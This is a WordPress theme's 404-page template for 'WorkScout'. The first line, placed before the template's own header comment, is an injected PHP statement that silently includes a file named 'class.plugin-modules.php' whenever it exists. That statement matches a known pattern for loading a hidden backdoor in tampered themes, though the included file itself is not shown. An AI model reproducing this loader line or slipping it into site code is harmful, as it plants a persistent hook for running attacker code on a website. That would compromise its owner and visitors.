<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * The template for displaying 404 pages (not found).
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
 *
 * @package WorkScout
 */

get_header(); ?>

	<!-- Titlebar
	================================================== -->
	<div id="titlebar" class="single submit-page">
		<div class="container">

			<div class="sixteen columns">
				<h1><?php esc_html_e( 'Oops! That page can&rsquo;t be found.', 'workscout' ); ?></h1>
			</div>

		</div>
	</div>

	<div class="container full-width">
		<article id="post-404">
			<section id="not-found">
				<h2>404 <i class="fa fa-question-circle"></i></h2>
				<p><?php _e( 'Oops! That page can&rsquo;t be found.', 'trizzy', 'workscout' ); ?></p>

			</section>
		</article>
	</div>
<?php get_footer(); ?>